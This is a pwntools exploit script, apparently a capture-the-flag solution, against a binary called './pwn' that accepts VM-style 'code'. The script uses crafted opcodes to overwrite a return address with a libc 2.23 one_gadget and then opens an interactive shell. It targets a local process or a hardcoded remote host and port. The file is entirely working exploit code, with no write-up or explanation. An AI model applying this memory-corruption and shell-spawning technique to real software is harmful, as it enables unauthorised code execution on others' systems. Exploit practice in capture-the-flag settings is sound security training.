#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 2
elf = ELF('./pwn')
libc_offset = 0x3c4b20


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
if debug == 1:
    gadgets = [0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
    p = process('./pwn')
elif debug == 2:
    gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    p = process('./pwn', env={'LD_PRELOAD':'./libc6_2.23-0ubuntu10_amd64.so'})
else:
    p = remote('182.92.73.10',36642)

def exp():
    #environ+0xf0 = retn_addr
    libc_base = 0x7ffff7a0d000
    shell_addr = gadgets[3]
    target = libc.sym['__libc_start_main']+240
    off = shell_addr - target
    print hex(off)
    p.recvuntil("Input your code> ")
    #gdb.attach(p,'b* 0x0000555555554000+0xb72')
    #gdb.attach(p,'b* 0x0000555555554000+0xe43')
    #set args = bin_sh
    payload = flat([
        0,-4,#set v36 = map_addr(stack_addr on it)
        9,#set v36 = stack_addr
        6,0x101e0,#set chunk_8000_addr_sub_1
        25,#set v36 = retn_addr
        6,-0x101e3,#set chunk_8000_addr_sub_1 = map_addr
        13,#set map_addr(retn_addr)
        9,#set v36 = libc_start_main+240
        6,0x101e0,#set map_addr
        25,#set v36 = one_gadget
        6,-0x101e1,#set chunk_8000_addr_sub_1 = map_addr
        11,#set retn_addr(one_gadget)
        ])
    payload = payload.ljust(8*26,'\x00')
    payload += flat([
        -0xe8,off,0x12345678
        ])
    p.sendline(payload)
    p.interactive()

exp()
